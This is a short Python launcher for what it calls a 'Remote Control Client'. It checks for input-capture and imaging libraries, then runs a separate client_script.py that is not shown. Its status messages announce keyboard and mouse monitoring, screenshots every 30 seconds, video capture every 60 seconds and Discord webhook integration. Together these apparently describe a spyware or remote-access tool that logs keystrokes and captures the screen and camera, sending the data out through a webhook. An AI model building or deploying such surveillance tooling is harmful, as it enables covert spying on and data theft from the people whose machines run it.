#!/usr/bin/env python3
"""
Simple launcher for the client script
"""

import os
import sys
import subprocess

def main():
    print("🚀 Launching Remote Control Client...")
    print("="*40)
    
    # Check if client_script.py exists
    if not os.path.exists("client_script.py"):
        print("❌ Error: client_script.py not found")
        print("Make sure you're in the correct directory")
        sys.exit(1)
    
    # Check if dependencies are installed
    try:
        import requests
        import PIL
        import pynput
        import cv2
        print("✅ Dependencies check passed")
    except ImportError as e:
        print(f"❌ Missing dependency: {e}")
        print("Run: python install.py to install dependencies")
        sys.exit(1)
    
    print("\n📡 Starting client on port 9999...")
    print("📱 Discord webhook integration enabled")
    print("⌨️  Keyboard and mouse monitoring active")
    print("📸 Screenshot capture every 30 seconds")
    print("📹 Video capture every 60 seconds")
    print("\nPress Ctrl+C to stop the client")
    print("="*40)
    
    try:
        # Run the client script
        subprocess.run([sys.executable, "client_script.py"])
    except KeyboardInterrupt:
        print("\n🛑 Client stopped by user")
    except Exception as e:
        print(f"\n❌ Error running client: {e}")

if __name__ == "__main__":
    main()